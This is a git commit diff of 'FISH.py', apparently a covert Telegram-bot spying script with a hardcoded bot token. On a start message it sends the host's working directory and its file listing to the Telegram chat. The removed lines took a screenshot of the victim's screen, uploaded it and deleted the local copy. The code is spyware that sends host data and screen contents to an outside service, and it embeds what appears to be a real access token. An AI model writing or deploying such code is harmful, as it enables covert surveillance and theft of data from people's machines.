20baf6edc1549ccd55054e786cdd47f1694ad155
ghert213 <73192899+ghert213@users.noreply.github.com>
2021-01-29 13:21:30 +0300

    Update FISH.py

--- FISH.py
+++ FISH.py
@@ -1,5 +1,3 @@
-
-import pyautogui
 import telebot
 import os
 
@@ -11,22 +9,16 @@ bot = telebot.TeleBot('1474693090:AAFs0giKJPrzCqk5kpbZlTyKZn7M1hxQ6gw')
 def start_message(message):
 	
 
-	im2 = pyautogui.screenshot('my_screenshot.png')
 	
 	bot.send_message(message.chat.id, os.getcwd())
 	
 	bot.send_message(message.chat.id, os.listdir(os.getcwd()))
 	
-	bot.send_document(message.chat.id, open('my_screenshot.png', 'rb'))
 	
-	os.remove('my_screenshot.png')
 
 
 
 bot.polling()
-
-
-
 
 
 
